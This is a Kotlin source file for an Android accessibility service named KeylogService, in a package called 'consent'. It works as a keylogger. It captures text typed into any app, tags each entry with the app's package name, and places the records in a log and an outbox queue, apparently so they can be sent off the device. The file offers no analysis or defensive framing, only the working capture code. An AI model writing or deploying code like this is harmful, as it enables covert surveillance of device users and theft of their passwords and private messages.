package com.vlink.consent

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import org.json.JSONObject

class KeylogService : AccessibilityService() {
    private val last = HashMap<String, Long>()

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        e ?: return
        if (e.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
        val text = e.text?.joinToString(" ")?.trim().orEmpty()
        if (text.isBlank()) return
        val pkg = e.packageName?.toString() ?: return
        val now = System.currentTimeMillis()
        if ((last[pkg] ?: 0L) + 600L > now) return
        last[pkg] = now
        val p = JSONObject().put("app", pkg).put("text", text)
        EventLog.add(this, "keylog", p)
        Outbox(this).put("keylog", p)
    }

    override fun onInterrupt() {}
}
